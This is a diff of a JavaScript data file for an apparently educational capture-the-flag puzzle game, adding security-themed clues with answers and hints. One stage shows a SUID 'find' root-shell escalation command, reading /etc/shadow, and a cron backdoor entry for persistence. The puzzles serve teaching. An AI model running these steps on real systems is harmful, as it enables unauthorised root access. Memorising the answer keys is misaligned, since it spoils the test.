+FLAG{MATH_WORD_WORD}`,
+        answer: norm("flag{math_breaks_ciphers}"),
+        hint: "What does mathematics do to every cipher that has ever been designed? Two words."
       }
     ]
   },
 
   {
-    id: 23, name: "The Maze of Mirrors", tier: "TIER V — THE VAULT",
-    flag: makeFlag("TRUST_YOUR_INSTINCTS"),
+    id: 23, name: "The Shell Session", tier: "TIER V — THE VAULT",
+    flag: makeFlag("ROOT_IS_THE_GOAL"),
     clues: [
       {
         id: 1,
-        text: `A maze where every path seems to loop back on itself.
+        text: `A penetration tester gains a shell on a Linux machine and runs:
 
-Entrance riddle:
+  id
 
-  "I have no beginning and no end.
-   I am a line that connects to itself.
-   I can be drawn without lifting a pen.
-   I am the simplest closed curve.
-   What shape am I?"`,
-        answer: norm("circle"),
-        hint: "A continuous closed curve. No corners. No start or end point."
+Output:
+  uid=1001(webuser) groups=1001(webuser)
+
+The tester is not the most privileged user.
+The most privileged Linux account has a specific numeric user ID.
+
+What is that numeric UID?`,
+        answer: norm("0"),
+        hint: "Every Linux system has exactly one superuser account. Its UID is the same on every system — the very first number."
       },
       {
         id: 2,
-        text: `First junction. Two paths. Two signs.
+        text: `The tester looks for SUID binaries — executables that run with their owner's permissions
+regardless of who executes them.
 
-  Path A sign: "This path is safe."
-  Path B sign: "Path A is dangerous."
+Command: find / -perm -4000 -type f 2>/dev/null
 
-Exactly one sign is lying.
+Output includes:
+  /usr/bin/passwd
+  /usr/bin/sudo
+  /usr/bin/find
 
-If Path B is actually safe:
-  - Path A sign ("this path is safe") would be FALSE ✓
-  - Path B sign ("Path A is dangerous") would be TRUE ✓
-  → Exactly one lie. Consistent.
+The 'find' binary is SUID root — this is unusual and exploitable.
+Running find with the -exec flag executes a command as root.
 
-Which path is safe?`,
-        answer: norm("b"),
-        hint: "If B is safe, A is dangerous. Path A's sign (says 'safe') is lying. Path B's sign (says 'A dangerous') is true. Exactly one lie → B is safe."
+If a tester runs:
+  find . -exec /bin/sh -p \; -quit
+
+What privilege level does the resulting shell have?`,
+        answer: norm("root"),
+        hint: "SUID means the binary runs as its owner. /usr/bin/find is owned by root and has SUID set. When it executes /bin/sh..."
       },
       {
         id: 3,
-        text: `Deep in the maze. A mirror shows reflected text.
+        text: `With root access, the tester reads /etc/shadow.
 
-Mirrors reverse left-to-right. To read what's actually written, reverse the whole string.
+An entry looks like:
+  admin:$6$xyz123$AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdefgh:19000:0:99999:7:::
 
-The mirror shows: STCNITSNI RUOY TSURT
+The $6$ identifies the password hashing algorithm used.
 
-Reverse the entire reflected text to find the actual message.`,
-        answer: norm("trust your instincts"),
-        hint: "Reverse STCNITSNI RUOY TSURT: TRUST YOUR INSTINCTS."
+Hash type identifiers:
+  $1$  = MD5
+  $2a$ / $2b$ = bcrypt
+  $5$  = SHA-256
+  $6$  = ?
+
+What algorithm does $6$ indicate?`,
+        answer: norm("sha-512"),
+        hint: "SHA comes in several variants. $5$ is SHA-256. $6$ is the next stronger variant."
       },
       {
         id: 4,
-        text: `The final chamber's combination lock:
+        text: `The tester sets up persistence using a cron job.
 
-  "Combination = total letters in clue 3's message, minus number of words."
+Cron syntax: [minute] [hour] [day] [month] [weekday] [command]
+  * means "every" value in that field
+  */5 means "every 5th" value
 
-Count:
-  Total letters in TRUST YOUR INSTINCTS (no spaces): ?
-  Number of words: ?
-  Subtract words from letters.`,
-        answer: norm("15"),
-        hint: "TRUST(5)+YOUR(4)+INSTINCTS(9)=18 letters. 3 words. 18-3=15."
+Cron entry:
+  */5 * * * * /tmp/backdoor.sh
+
+How frequently does /tmp/backdoor.sh execute?`,
+        answer: norm("every 5 minutes"),
+        hint: "*/5 in the minutes field means every 5 minutes. The remaining fields are all *, meaning any hour, any day."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 23
 
-The mirror in the final chamber reflected the truth you needed.
-You decoded it in clue 3.
+Post-exploitation is the phase after gaining initial access.
+The primary objective: escalate from a low-privilege account
+to the system's most powerful account.
 
-Submit it as the flag. FLAG{WORD_YOUR_WORD}`,
-        answer: norm("flag{trust_your_instincts}"),
-        hint: "TRUST YOUR INSTINCTS — from clue 3."
+Everything in this stage pointed toward one target.
+
+The flag: what that target is.
+
+FLAG{WORD_IS_THE_WORD}`,
+        answer: norm("flag{root_is_the_goal}"),
+        hint: "What is the name of the account that uid=0 represents? That's what every pentester is trying to reach."
       }
     ]
   },
 
   {
-    id: 24, name: "The Archive's Core", tier: "TIER V — THE VAULT",
-    flag: makeFlag("THE_END_IS_THE_BEGINNING"),
+    id: 24, name: "The Protocol Dissector", tier: "TIER V — THE VAULT",
+    flag: makeFlag("PACKETS_TELL_STORIES"),
     clues: [
       {
         id: 1,
-        text: `The heart of The Archive. This puzzle references Stage 1.
+        text: `A raw TCP packet header, shown in hexadecimal:
 
-In Stage 1, Clue 4, you decoded hex pairs 4F 50 45 4E 53 to get OPENS.
+  00 50        ← Source port
+  01 BB        ← Destination port
+  00 00 04 D2  ← Sequence number
+  00 00 00 00  ← Acknowledgment number
+  60 02        ← Data offset + flags
+  FF FF        ← Window size
 
-Now encode the word ENDS in hex.
-ASCII: E=69, N=78, D=68, S=83
+Convert the source port (00 50) and destination port (01 BB)
+from hexadecimal to decimal.
 
-Write the hex value of each letter (2 digits each, space-separated).`,
-        answer: norm("45 4e 44 53"),
-        hint: "E=69=45hex, N=78=4Ehex, D=68=44hex, S=83=53hex → 45 4E 44 53."
+Submit as: srcport:dstport`,
+        answer: norm("80:443"),
+        hint: "Each port is a two-byte hex value. Treat them as base-16 numbers and convert. Do you recognise these port numbers from Stage 8?"
       },
       {
         id: 2,
-        text: `From Stage 2, you used Atbash to decode ULOOLD to FOLLOW.
+        text: `TCP uses a flags byte to indicate connection state.
 
-Now encode the word END using Atbash.
+Flag bit positions (from LSB to MSB):
+  Bit 0 = 0x01 = FIN
+  Bit 1 = 0x02 = SYN
+  Bit 2 = 0x04 = RST
+  Bit 3 = 0x08 = PSH
+  Bit 4 = 0x10 = ACK
+  Bit 5 = 0x20 = URG
 
-Atbash: A↔Z, B↔Y, C↔X, D↔W, E↔V, N↔M`,
-        answer: norm("vmw"),
-        hint: "E→V, N→M, D→W → VMW."
+A captured packet has flags byte: 0x12
+
+Convert 0x12 to binary. Then check which bit positions are set (equal to 1).
+
+Which two TCP flags are active in this packet?
+Submit flag names comma-separated.`,
+        answer: norm("syn,ack"),
+        hint: "Convert 0x12 to binary first. Then map each set bit to its flag name using the table above."
       },
       {
         id: 3,
-        text: `From Stage 4, you decoded ROT13 GEHFG to get TRUST.
+        text: `The sequence number field from the packet header: 00 00 04 D2
 
-Now decode this ROT13 message:
-
-  GUR RAQVAT VF GUR ORTVAAVAT`,
-        answer: norm("the ending is the beginning"),
-        hint: "GUR=THE, RAQVAT=ENDING, VF=IS, GUR=THE, ORTVAAVAT=BEGINNING."
+Convert this four-byte hexadecimal value to decimal.`,
+        answer: norm("1234"),
+        hint: "Ignore the leading zeros. Focus on 04 D2. Each hex digit is worth 16× the position to its right."
       },
       {
         id: 4,
-        text: `The Archive's central paradox, revealed in clue 3:
+        text: `The packet's payload is hex-encoded. Convert to ASCII first, then decode:
 
-  "THE ENDING IS THE BEGINNING"
+  59 32 68 68 61 57 35 6C 5A 41 3D 3D
 
-Condense it to five words by removing IS:
-  THE END ___ THE BEGINNING
+Step 1: Convert each hex byte to its ASCII character.
+Step 2: The resulting ASCII string is Base64-encoded — decode it.
 
-What word fills the blank?`,
-        answer: norm("is"),
-        hint: "THE END IS THE BEGINNING. The missing word between END and THE is IS."
+What word is in the final decoded payload?`,
+        answer: norm("channel"),
+        hint: "You're doing two conversions: hex → ASCII gives you a Base64 string, then Base64 → plaintext gives you the word. Use the tools from earlier stages."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 24
 
-The Archive's core truth — its central paradox.
+A skilled network analyst can reconstruct an entire conversation —
+who connected to what, which service, what data was exchanged —
+just by examining raw packet bytes.
 
-  THE END IS THE BEGINNING
+Ports reveal services. Flags reveal connection state.
+Sequence numbers reveal data flow. Payloads carry the truth.
 
-Submit as the flag. FLAG{WORD_END_IS_WORD_WORD}`,
-        answer: norm("flag{the_end_is_the_beginning}"),
-        hint: "THE END IS THE BEGINNING — five words."
+The flag: what packets do for someone who knows how to read them.
+
+FLAG{PACKETS_WORD_WORD}`,
+        answer: norm("flag{packets_tell_stories}"),
+        hint: "What does a packet capture do for a skilled analyst? It ___ stories — about connections, data, and behaviour."
       }
     ]
   },
@@ -1743,103 +2098,101 @@ Submit as the flag. FLAG{WORD_END_IS_WORD_WORD}`,
     clues: [
       {
         id: 1,
-        text: `THE FINAL STAGE. 25 stages. 124 clues before this one.
+        text: `THE FINAL STAGE.
 
-Prove you walked the full path.
+Recall your work from Stage 1, Clue 3:
+  You decoded hex bytes 42 49 54 53 to a four-letter word.
 
-From Stage 5 Clue 1, you decoded Morse to find the word MESSAGE.
+And from Stage 7, Clue 2:
+  You decoded a Base64 string to a five-letter word.
 
-Now decode this Morse (using the same reference from Stage 5):
+XOR the ASCII value of the FIRST letter of each word together.
 
-  ·−·· ·− ··· −
-
-Morse: A=·−  D=−··  E=·  L=·−··  S=···  T=−
-
-What four-letter word do you get?`,
-        answer: norm("last"),
-        hint: "·−··=L, ·−=A, ···=S, −=T → LAST."
+Submit the decimal result of that XOR operation.`,
+        answer: norm("42"),
+        hint: "Get both words from memory. Take only the first letter of each. Find their ASCII decimal values. XOR those two numbers using binary arithmetic."
       },
       {
         id: 2,
-        text: `From Stage 3, you used Caesar cipher.
-From Stage 1, you used ASCII number codes.
+        text: `Recall your work from Stage 11, Clue 3:
+  You identified a famous password from its MD5 hash.
 
-Combine both:
+And from Stage 17, Clue 4:
+  You computed a modulo operation and got a single-digit result.
 
-Number code (A=1...Z=26): 19 20 1 7 5
+Take the ASCII value of the first letter of the Stage 11 password.
+Subtract the Stage 17 result from it.
 
-First decode to letters. Then apply Caesar shift +1 to each letter.
-What five-letter word results?`,
-        answer: norm("tubhf"),
-        hint: "19=S,20=T,1=A,7=G,5=E → STAGE. Then STAGE+1: S→T,T→U,A→B,G→H,E→F = TUBHF."
+What is the final value?`,
+        answer: norm("111"),
+        hint: "Find the ASCII value of the first letter of that famous password. Subtract the small number you computed in Stage 17."
       },
       {
         id: 3,
-        text: `From Stage 21, you decoded Atbash.
-From Stage 4, you decoded ROT13.
+        text: `Recall Stage 13, Clue 3:
+  You encoded a modified JSON string using btoa() in the browser console.
+  The result was a Base64 string.
 
-Apply BOTH — first Atbash, then ROT13 — to: ZIXSREV
+Count the total number of characters in that Base64 output.
+Include the = padding characters.
 
-Step 1: Atbash decode ZIXSREV.
-Step 2: ROT13 the result of step 1.
-
-What is the final word?`,
-        answer: norm("nepuver"),
-        hint: "Step 1 Atbash: Z→A,I→R,X→C,S→H,R→I,E→V,V→E = ARCHIVE. Step 2 ROT13(ARCHIVE): A→N,R→E,C→P,H→U,I→V,V→I,E→R = NEPUVER."
+How many characters long is it?`,
+        answer: norm("56"),
+        hint: "Go back to Stage 13, Clue 3 and run the btoa() command again if needed. Count every character in the output including = signs."
       },
       {
         id: 4,
-        text: `The master index requires one final key.
+        text: `Combine your three results from this stage:
 
-Take the FLAG from every stage you completed in Tier I.
-Read only the FIRST WORD of each flag (after FLAG{...}):
+  Clue 1 result: XOR of two ASCII values
+  Clue 2 result: ASCII subtraction
+  Clue 3 result: character count
 
-  Stage 1: FLAG{THE_ARCHIVE_OPENS}   → THE
-  Stage 2: FLAG{FOLLOW_THE_SIGNAL}   → FOLLOW
-  Stage 3: FLAG{KEY_IS_KNOWLEDGE}    → KEY
-  Stage 4: FLAG{TRUST_THE_PROCESS}   → TRUST
-  Stage 5: FLAG{MESSAGE_RECEIVED}    → MESSAGE
+Compute: (clue_1 XOR clue_2) + clue_3
 
-Take the FIRST LETTER of each of those five words, in order.
+Perform the XOR operation first, then add.
 
-What five letters do they spell?`,
-        answer: norm("tfktm"),
-        hint: "THE→T, FOLLOW→F, KEY→K, TRUST→T, MESSAGE→M → TFKTM."
+Submit the final number.`,
+        answer: norm("125"),
+        hint: "Use the values you computed in clues 1, 2, and 3 of this stage. XOR the first two results together in binary, then add the third."
       },
       {
         id: 5,
-        text: `FINAL SEAL — THE ARCHIVE
+        text: `FINAL SEAL — THE ARCHIVE COMPLETE
 
-You have walked all 25 stages.
-You have decoded, discovered, deduced, and persisted.
+25 stages.
+125 clues.
 
-The Archive is fully open to you.
+You decoded binary, hex, and Base64.
+You traced logic circuits and call stacks.
+You dissected TCP packets at the byte level.
+You computed RSA components by hand.
+You broke SQL injection and cookie tampering.
+You peeled layered encryption.
+You traced timing attacks and side channels.
 
-The master index's final entry:
+The Archive is open.
 
-  ARCHIVE UNLOCKED
-
-Submit your ultimate flag. FLAG{WORD_WORD}`,
+FLAG{WORD_WORD}`,
         answer: norm("flag{archive_unlocked}"),
-        hint: "ARCHIVE UNLOCKED. You earned it."
+        hint: "What happens to an archive when someone with the skill and persistence to solve 124 clues arrives at the final door?"
       }
     ]
   }
 
 ];
 
-// Validate data integrity on load
 function validateStages() {
   if (STAGES.length !== 25) throw new Error(`Expected 25 stages, got ${STAGES.length}`);
   STAGES.forEach((stage) => {
-    if (stage.clues.length !== 5) throw new Error(`Stage ${stage.id} has ${stage.clues.length} clues, expected 5`);
+    if (stage.clues.length !== 5) throw new Error(`Stage ${stage.id} has ${stage.clues.length} clues`);
     if (!stage.flag) throw new Error(`Stage ${stage.id} missing flag`);
     stage.clues.forEach((clue) => {
       if (!clue.answer) throw new Error(`Stage ${stage.id} clue ${clue.id} missing answer`);
       if (!clue.hint) throw new Error(`Stage ${stage.id} clue ${clue.id} missing hint`);
     });
   });
-  console.log(`[Archive] Stage data validated: ${STAGES.length} stages, ${STAGES.length * 5} clues total.`);
+  console.log(`[Archive] Validated: ${STAGES.length} stages, ${STAGES.length * 5} clues.`);
 }
 
 validateStages();
